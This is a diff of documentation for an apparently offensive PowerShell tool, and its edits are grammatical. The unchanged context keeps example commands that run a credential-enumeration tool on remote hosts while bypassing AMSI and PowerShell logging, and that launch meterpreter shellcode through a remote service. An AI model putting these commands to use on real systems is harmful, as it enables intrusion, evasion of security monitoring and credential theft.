@@ -13,7 +13,7 @@ New-PowerLoader                 -   builds script block for in-memory execution 
 
 ## Payload types
 
-Payload type must be specified within the function `New-PowerLoader`:
+The payload type must be specified within the function `New-PowerLoader`:
 
 | Type      | Description                               |
 | --------- | ----------------------------------------- |
@@ -68,7 +68,7 @@ Run a .NET assembly through WinRM while bypassing AMSI, PowerShell Module Loggin
 PS C:\> New-PowerLoader -Type NetAsm -FilePath .\Seatbelt.exe -ArgumentList 'CredEnum' -Bypass AMSI,PML,SBL | Invoke-PowerExec -ComputerList 192.168.1.1,192.168.1.2 -Method WinRM
 ```
 
-Run a shellcode through a scheduled task :
+Run a shellcode through a service :
 
 ```
 PS C:\> New-PowerLoader -Type Shellcode -FilePath .\meterpreter.bin | Invoke-PowerExec -ComputerList 192.168.1.1 -Method CimService -Protocol Dcom
